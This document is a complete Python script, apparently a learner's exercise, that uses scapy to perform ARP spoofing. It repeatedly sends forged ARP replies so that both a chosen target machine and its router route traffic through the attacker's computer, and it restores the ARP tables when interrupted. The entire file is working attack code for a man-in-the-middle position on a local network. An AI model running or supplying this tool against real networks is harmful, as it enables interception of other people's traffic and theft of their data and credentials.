import sys
import time
import scapy.all as scapy
import getmac
import optparse


def commandLine():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP")
    parser.add_option("-r", "--router", dest="router", help="Target Router")
    (options, arguments) = parser.parse_args()
    return options


def spoof(target_ip, spoof_ip):
    target_mac = getmac.get_mac_address(ip=target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # respond
    scapy.send(packet, verbose=False)  # thinks that this machine now is the router


def restore(destination, source):
    dest_mac = getmac.get_mac_address(ip=destination)
    source_mac = getmac.get_mac_address(ip=source)
    # hwsrc, if we don't assign, it will automatically assign current computer mac address
    # if write manually, we assigns
    packet = scapy.ARP(op=2, pdst=destination, hwdst=dest_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


count_sending_packet = 0
options = commandLine()
target_ip = str(options.target)
gateway_ip = str(options.router)
# continue to attack all the time
try:
    while True:
        spoof(target_ip, gateway_ip)  # victim
        spoof(gateway_ip, target_ip)  # router
        count_sending_packet += 2
        print("\r[+] packets sent: " + str(count_sending_packet))
        sys.stdout.flush()
        time.sleep(2)  # delay to reduce sending too many packets
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ...... Resetting ARP")
    # when program turn off, restore everything it was
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
